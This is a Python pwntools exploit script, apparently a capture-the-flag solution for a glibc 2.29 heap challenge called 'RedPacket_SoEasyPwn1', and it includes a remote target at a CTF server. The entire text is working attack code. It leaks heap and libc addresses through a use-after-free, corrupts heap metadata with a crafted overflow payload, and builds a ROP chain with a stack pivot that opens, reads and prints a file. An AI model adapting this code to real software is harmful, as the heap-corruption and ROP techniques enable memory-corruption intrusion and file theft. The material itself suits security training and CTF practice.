#coding=utf-8
from pwn import *
local = 1
exec_file="RedPacket_SoEasyPwn1"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
argv=["/glibc/x64/2.29/lib/ld-2.29.so","--library-path","/glibc/x64/2.29/lib/","./RedPacket_SoEasyPwn1"]
if local :
    a=process(argv=argv)
    libc=ELF("/glibc/x64/2.29/lib/libc.so.6",checksec = False)
else:
    a=remote("node3.buuoj.cn","27056")
    libc=ELF("./libc-2.29.so")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    #text_base,libc_base=get_base(a)
    #script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script='''
    b *(0x7ffff7ff2000+0x00000000000173F)
    b *(0x0000000000016C1+0x7ffff7ff2000)
    b *(0x7ffff7ff2000+0x000000000001856)
    b *(0x0000000000013C5+0x7ffff7ff2000)
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your input: ",str(idx))
def add(idx,size,content):
    menu(1)
    a.sendlineafter("Please input the red packet idx: ",str(idx))
    a.sendlineafter("4.0x400): ",str(size))
    a.sendafter("content: ",content)

def delete(idx):
    menu(2)
    a.sendlineafter("idx: ",str(idx))

def show(idx):
    menu(4)
    a.sendlineafter("idx: ",str(idx))
def edit(idx,content):
    menu(3)
    a.sendlineafter("red packet idx: ",str(idx))
    a.sendafter("content: ",content)

# 1.0x10 2.0xf0 3.0x300 4.0x400


add(0,1,'AAA')
add(1,1,'AAA')
delete(0)
delete(1)
show(1)
if local==0:
    heap_addr = u64(a.recvuntil("\n",drop=True).ljust(8,'\x00'))
else:
    heap_addr = 0x7ffff8000270
heap_addr -= 0x1270
fuck(heap_addr)

for i in range(8):
    add(i,4,'AA')

delete(7)
for i in range(7):
    delete(i)
show(6)

main_arena = u64(a.recvuntil("\n",drop=True).ljust(8,'\x00'))-96
fuck(main_arena)

libc_base = main_arena - libc.symbols["__malloc_hook"]-0x10 
fuck(libc_base)


for i in range(7):
    add(0,2,'A')
    delete(0)


add(0,4,'A')
add(1,4,'A')
delete(0)
add(0,3,'A')
add(1,4,'A')


#debug()
add(2,4,'A') #0x7ffff8003250
add(0,4,'A')#
delete(2)

add(0,3,'A')
add(1,4,'A')

target_addr =heap_addr+0xa50+0x10
fuck(target_addr)


payload = 'A'*0x308+p64(0x101)+p64(heap_addr+0x3930)+p64(target_addr-0x10)

edit(2,payload)
debug()
#debug()
add(0,2,'A')

pop_rdi_ret = libc_base+0x0000000000026542
leave_ret = libc_base+0x0000000000058373
pop_rdx_pop_rsi_ret = libc_base+0x000000000012bdc9
pop_rsi_ret = libc_base+0x0000000000026f9e
open_addr = libc_base+libc.symbols["open"]
read_addr = libc_base+libc.symbols["read"]
puts_addr = libc_base+libc.symbols["puts"]

rop_addr = heap_addr+0x4e90
flag_addr = rop_addr+14*8

payload = p64(pop_rdi_ret)
payload += p64(flag_addr)
payload += p64(pop_rsi_ret)
payload += p64(0)
payload += p64(open_addr)
payload += p64(pop_rdi_ret)
payload += p64(3)
payload += p64(pop_rdx_pop_rsi_ret)
payload += p64(0x60)
payload += p64(heap_addr)
payload += p64(read_addr)
payload += p64(pop_rdi_ret)
payload += p64(heap_addr)
payload += p64(puts_addr)
payload += "./links.txt\x00"
#debug()
add(0,4,payload)

menu(666)
a.sendafter("What do you want to say?",'A'*0x80+p64(rop_addr-8)+p64(leave_ret))



a.interactive()







